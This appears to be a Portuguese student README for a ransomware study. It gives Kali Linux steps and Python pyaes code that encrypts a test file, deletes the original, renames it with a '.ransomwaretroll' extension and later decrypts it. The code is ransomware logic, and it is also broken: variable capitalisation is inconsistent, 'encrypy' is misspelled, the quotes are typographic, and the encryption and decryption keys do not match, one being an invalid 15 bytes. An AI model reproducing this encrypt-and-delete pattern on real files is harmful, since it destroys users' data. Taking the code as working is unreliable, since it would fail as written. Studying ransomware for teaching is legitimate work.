# Estudo de Rasomware, encriptografando e descriptografando com Python

### Ferramentas

- Kali Linux
- pyaes


### Configuração do Arquivo Txt e do código Python no Kali Linux
Criar os Arquivos com o comando nano (usado para escrever/editar dentro de um arquivo) ou touch (usado para criar um arquivo) no terminal do Linux depois que estiver dentro da pasta “projeto-ransomware"



- encrypter.py

- decrypter.py

- teste.txt



### 2º ETAPA
Insira inforamções no documento ou identifique algum que já exista.

- Salvar com o ctrl + o;
- Depois de Enter;
- Depois Ctrl + x para salvar.


### 3º ETAPA
Verifique se possui as permissões para instalar a bibliteca Python com o comando:

- pip install pyaes

Depois prossiga com os comandos

- Import os
- Import pyaes


 
### Código para ecrypter.txt:

 
File­_name =‘teste.txt’

File = open(file_name, ‘rb’)

File_data = file.read()

File.close()

os.remove(file_name)

Key = b“testeransomware”

Aes = pyaes.AESModeOfOperationCTR(key)

Crypto_data = aes.encrypy(file_data)

new_file = file_name + ‘.ransomwaretroll'

new_file = open(f‘{new_file}’,‘wb’)

new_file.write(crypto_data)

new_file.close()

 

### Código para decrypter.txt:

file_name = ‘teste.txt.ransomwaretroll’

file = open(file_name, ‘rb’)

file_data = file.read()

file.close()

key = b‘testeransomwares’

aes = pyaes.AESModeOfOperationCTR(key)

decrypt_data = aes.decrypt(file_data)

os.remove(file_name)

new_file = ‘teste.txt’

new_file = open(f'{new_file}', ‘wb’)

new_file.write(decrypt_data)

new_file.close()

 
## ETAPA FINAL
Realizar os comandos de criptografar, listar arquivos (para ver o resultado), descriptografar abaixo e listar arquivos novamente (para ver o resultado final)

python encrypter.py

ls

python decrypter.py

ls

### Resutados anexados na pasta.
